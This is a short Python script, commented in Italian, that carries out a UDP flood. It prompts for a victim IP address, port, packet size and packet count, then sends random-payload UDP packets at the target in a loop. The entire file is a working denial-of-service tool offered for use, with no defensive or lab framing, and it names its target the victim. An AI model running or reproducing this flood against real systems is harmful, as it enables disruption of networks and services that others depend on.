import random as rd # usato per generare paacchetti randomici
import socket as so # usato per creare un socket

def udp_flood(vittimaip, porta, peso, numeropacchetti): 
    client = so.socket(so.AF_INET, so.SOCK_DGRAM) #creazione di un socket UDP
    
    for _ in range(numeropacchetti): #è una funzione che si ripete per un numero di volte specificato dalla variabile
        pacchetto = rd.getrandbits(peso *8).to_bytes(peso, 'big') #impostazione del peso del pacchetto
        client.sendto(pacchetto, (vittimaip, porta)) #indirizzamento del pacchetto
        

if __name__ == "__main__": # assicura che il codice venga eseguito nse il file viene eseguito correttamente
    
    vittimaip = (input("Inserisci l'IP: "))        #inserimento di determinati parametri
    porta = int(input("Inserisci la porta: "))
    peso = int(input("Inserisci il peso del pacchetto (in byte): "))
    numeropacchetti = int(input("Inserisci il numero di pacchetti: "))
    
    udp_flood(vittimaip, porta, peso, numeropacchetti)  #riprende la funzione udp floo
